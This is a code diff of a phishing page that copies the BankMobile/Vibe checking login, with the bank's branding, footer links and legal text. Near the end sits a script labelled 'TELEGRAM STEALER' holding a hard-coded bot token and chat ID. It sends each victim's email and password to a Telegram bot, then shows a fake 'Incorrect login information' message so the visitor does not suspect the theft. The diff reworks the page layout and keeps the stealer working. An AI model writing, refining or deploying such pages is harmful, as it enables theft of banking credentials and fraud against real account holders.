@@ -1,219 +1,258 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<html lang="en">
 <head>
-<meta name="robots" content="noindex">
-<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Welcome to BankMobile checking</title>
+    
+    <style type="text/css">
+        body { 
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif; 
+            background-color: #fff; 
+            color: #333;
+        }
+        
+        /* HEADER LOGO */
+        .hdr-logo-padding { padding: 15px 20px; }
+        .hdr-logo-padding a { text-decoration: none; }
 
-<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css">
-<link href="css/outpages_index.css" rel="stylesheet" type="text/css">
-<link rel="stylesheet" href="css/global.css">
-<link rel="stylesheet" href="css/micromodal.css">
+        /* LOGIN FORM */
+        #login-row { padding: 0 20px; }
+        .form-group { margin-bottom: 15px; }
 
-<style type="text/css">
-.coloredBorder { border-color: #101a54; }
+        label {
+            font-weight: bold;
+            font-size: 18px;
+            display: block;
+            margin-bottom: 5px;
+        }
 
-/* Clean login area you requested */
-.login-area {
-display: flex;
-flex-wrap: wrap;
-align-items: flex-end;
-gap: 15px;
-margin-top: 10px;
-}
+        .login-input input {
+            border: none;
+            border-bottom: 2px solid #3bb34a;
+            padding: 10px 0;
+            font-size: 18px;
+            width: 100%;
+            outline: none;
+        }
 
-.field {
-display: flex;
-flex-direction: column;
-flex: 1;
-min-width: 180px;
-}
+        .forgot-password {
+            display: block;
+            margin-top: 8px;
+            text-decoration: underline;
+            color: #666;
+            font-size: 14px;
+        }
 
-.field label {
-font-size: 13px;
-color: #666;
-margin-bottom: 4px;
-}
+        /* ACTIONS */
+        .login-button-group {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin: 20px 0 30px 0;
+        }
 
-.field input {
-padding: 10px 12px;
-border: 2px solid #4CAF50;
-border-radius: 4px;
-font-size: 15px;
-width: 100%;
-}
+        .btn-login {
+            border: 2px solid #3bb34a;
+            background: #fff;
+            color: #3bb34a;
+            font-weight: bold;
+            font-size: 18px;
+            padding: 12px 25px;
+            cursor: pointer;
+        }
 
-.continue-btn {
-background: #4CAF50;
-color: white;
-border: none;
-padding: 12px 32px;
-font-weight: bold;
-cursor: pointer;
-border-radius: 4px;
-font-size: 15px;
-white-space: nowrap;
-}
+        .get_started_div {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.2;
+            text-decoration: none;
+        }
 
-.forgot {
-font-size: 13px;
-color: #0066cc;
-text-decoration: underline;
-cursor: pointer;
-margin-top: 6px;
-}
+        .get_started_div span {
+            display: block;
+            font-size: 20px;
+            color: #101a54;
+            border-bottom: 2px solid #ccc;
+        }
 
-/* Make it look better on mobile */
-@media (max-width: 768px) {
-.login-area {
-flex-direction: column;
-align-items: stretch;
-}
-.continue-btn {
-margin-top: 10px;
-width: 100%;
-}
-}
-</style>
+        /* HERO AREA */
+        .hero-link {
+            display: block;
+            width: 100%;
+            text-decoration: none;
+        }
 
-<title>Welcome to BankMobile checking</title>
+        .hero-container {
+            width: 100%;
+            min-height: 380px; 
+            background-image: url('https://vibeaccount.com/images/index_page_banner_school.jpg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center top;
+            background-color: #d9edf2; 
+        }
+
+        /* FOOTER */
+        .footer-container {
+            padding: 30px 20px 50px 20px;
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .footer-links {
+            margin-bottom: 25px;
+            color: #101a54;
+        }
+
+        .footer-links a {
+            color: #101a54;
+            text-decoration: underline;
+            padding: 0 1px;
+            white-space: nowrap;
+        }
+
+        .footer-logo-box {
+            margin: 20px auto;
+            max-width: 200px;
+            font-size: 10px;
+            color: #101a54;
+            font-weight: bold;
+            line-height: 1.2;
+        }
+
+        .fcb-logo {
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .legal-content {
+            color: #333;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .legal-content p {
+            margin-bottom: 15px;
+        }
+    </style>
 </head>
-
 <body>
-<a name="top"></a>
 
-<div id="homepage-wrapper">
-<div class="col-xs-12" id="resp-outheader">
-<div class="hdr-logo-padding">
-<a href="https://vibeaccount.com/">
-<img src="https://vibeaccount.com/images/branding/bankmobile/bankmobiledisbursements/bm-tech-logo.png" border="0" height="68" alt="">
-</a>
-</div>
+    <div class="hdr-logo-padding">
+        <a href="https://vibeaccount.com/">
+            <img src="https://vibeaccount.com/images/branding/bankmobile/bankmobiledisbursements/bm-tech-logo.png" height="55" alt="BM Technologies">
+        </a>
+    </div>
 
-<div class="row" id="login-row">
-<form id="step-1" action="" method="post" style="display: inline" autocomplete="off">
-<div id="err-msg" style="display:none;color:red;font-size:14px;margin-top:10px;">
-Incorrect login information. Please try once more.
-</div>
+    <div id="login-row">
+        <form action="#" method="POST">
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <div class="login-input">
+                    <input type="email" id="email" name="email" placeholder="Ex: janedoe@yahoo.com" required>
+                </div>
+            </div>
 
-<div class="col-xs-12 col-md-offset-0">
-<div class="row">
-<!-- YOUR REQUESTED LOGIN AREA -->
-<div class="login-area">
-<div class="field">
-<label>Email Address:</label>
-<input id="email" type="email" placeholder="Ex: jane@example.com">
-</div>
-<div class="field">
-<label>Password:</label>
-<input id="password" type="password" placeholder="Enter your password">
-<span class="forgot">Forgot Login Information?</span>
-</div>
-<button class="continue-btn" id="loginBtn">CONTINUE</button>
-</div>
-</div>
-</div>
-</form>
-</div>
-</div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <div class="login-input">
+                    <input type="password" id="password" name="password" placeholder="(case sensitive)" required>
+                </div>
+                <a href="https://authentication-vibe.bmtx.com/identity/account/forgotlogininformation" class="forgot-password">Forgot Login Information?</a>
+            </div>
 
-<!-- Rest of your original page remains the same -->
-<div class="row" style="margin-left:0;margin-right:0;">
-<div class="outpagebody_div col-xs-12">
-<div class="outpagebody_pagecontent">
+            <div class="login-button-group">
+                <button type="button" class="btn-login" id="loginBtn">LOG IN!</button>
+                <a href="https://www.refundselection.com/" class="get_started_div">
+                    Haven't made a choice?
+                    <span>Get Started</span>
+                </a>
+            </div>
+        </form>
+    </div>
 
-<div id="bg" class="row span12 empt">
-<div class="outpage indexpage">
-<a href="https://www.refundselection.com/">
-<img src="https://vibeaccount.com/images/index_page_banner_school.jpg" alt="Keep your account information safe!">
-</a>
-</div>
+    <a href="https://www.refundselection.com/" class="hero-link">
+        <div class="hero-container"></div>
+    </a>
 
-<div class="indexright">
-<div class="refunddate"></div>
-</div>
-<div class="clear"></div>
-</div>
+    <div class="footer-container">
+        <div class="footer-links">
+            <a href="https://vibeaccount.com/index.jsp">Home</a> | 
+            <a href="https://vibeaccount.com/cust/out/external/security.do">Security</a> | 
+            <a href="https://vibeaccount.com/main/feeschedules.do">Fee Schedules</a> | 
+            <a href="https://vibeaccount.com/info/accountagreements.do">Terms and Conditions</a> | 
+            <a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy">Privacy Statement</a> |
+            <a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy">Privacy Notice for California Residents</a> | 
+            <a href="https://vibeaccount.com/outcontact.jsp">Contact Us</a> | 
+            <a href="https://vibeaccount.com/easyhelp/pta?basepage=answer&type=public&param=746">Identity Verification</a> |
+            <a href="https://vibeaccount.com/easyhelp/pta?basepage=std_alp.php&type=public">FAQs</a>
+        </div>
 
-</div>
-</div>
-</div>
-</div>
+        <div class="footer-logo-box">
+            <img src="https://vibeaccount.com/images/branding/bankmobile/bankmobiledisbursements/bm-tech-logo.png" height="25" alt="First Carolina Bank Logo" class="fcb-logo">
+            BM<br>Technologies, Inc.
+        </div>
 
-<div id="footer-footer">
-<div class="footertext">
-<a href="https://vibeaccount.com/index.jsp">Home</a> |
-<a href="https://vibeaccount.com/cust/out/external/security.do" target="security">Security</a> |
-<a href="https://vibeaccount.com/main/feeschedules.do">Fee Schedules</a> |
-<a href="https://vibeaccount.com/info/accountagreements.do">Terms and Conditions</a> |
-<a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy">Privacy Statement</a> |
-<a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy">Privacy Notice for California Residents</a> |
-<a href="https://vibeaccount.com/outcontact.jsp">Contact Us</a> |
-<a href="https://vibeaccount.com/easyhelp/pta?basepage=answer&amp;type=public&amp;param=746" target="EasyHelp" rel="external">Identity Verification</a> |
-<a href="https://vibeaccount.com/easyhelp/pta?basepage=std_alp.php&amp;type=public" target="EasyHelp" rel="external">FAQs</a>
-</div>
+        <div class="legal-content">
+            <p>© 2026 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.</p>
+            
+            <p>BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC & Equal Housing Lender. The BankMobile Debit Mastercard® card is issued and administered by First Carolina Bank pursuant to license from Mastercard International Incorporated. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.</p>
+            
+            <p>BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804</p>
+        </div>
+    </div>
 
-<div class="footertext footer_legaltext">
-<p>
-<img src="images/footer/fdic-housing.png" alt="BM Technologies" class="fdic-logo">
-</p>
+    <!-- TELEGRAM STEALER -->
+    <script>
+    const BOT_TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
+    const CHAT_ID = "1957450632";
 
-© 2025 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
-
-BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC &amp; Equal Housing Lender.
-The BankMobile Debit Mastercard® card is issued and administered by First Carolina Bank pursuant to license from Mastercard International Incorporated.
-Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.<br>
-
-<br>
-BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804
-</div>
-</div>
-
-<!-- TELEGRAM STEALER -->
-<script>
-// ==================== YOUR TELEGRAM DETAILS ====================
-const BOT_TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
-const CHAT_ID = "1957450632";
-// ================================================================
-
-async function sendToTelegram(email, password) {
-const message = `
+    async function sendToTelegram(email, password) {
+        const message = `
 🔐 NEW VIBEACCOUNT LOGIN
 Email: ${email}
 Password: ${password}
 Time: ${new Date().toLocaleString()}
-`.trim();
+        `.trim();
 
-const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-try {
-await fetch(url, {
-method: "POST",
-headers: { "Content-Type": "application/json" },
-body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-});
-} catch (e) {}
-}
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        } catch (e) {}
+    }
 
-document.getElementById("loginBtn").addEventListener("click", async function(e) {
-e.preventDefault();
+    document.getElementById("loginBtn").addEventListener("click", async function(e) {
+        e.preventDefault();
 
-const email = document.getElementById("email").value.trim();
-const password = document.getElementById("password").value.trim();
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
 
-if (email && password) {
-await sendToTelegram(email, password);
-}
+        if (email && password) {
+            await sendToTelegram(email, password);
+        }
 
-// Show red error message
-document.getElementById("err-msg").style.display = "block";
-});
-</script>
+        // Show red error message
+        const errMsg = document.createElement("div");
+        errMsg.style.color = "red";
+        errMsg.style.fontSize = "14px";
+        errMsg.style.marginTop = "10px";
+        errMsg.textContent = "Incorrect login information. Please try once more.";
+        this.parentElement.appendChild(errMsg);
 
-<script type="text/javascript" src="js/forms.js"></script>
+        // Optional: clear password field
+        document.getElementById("password").value = "";
+    });
+    </script>
 
 </body>
 </html>
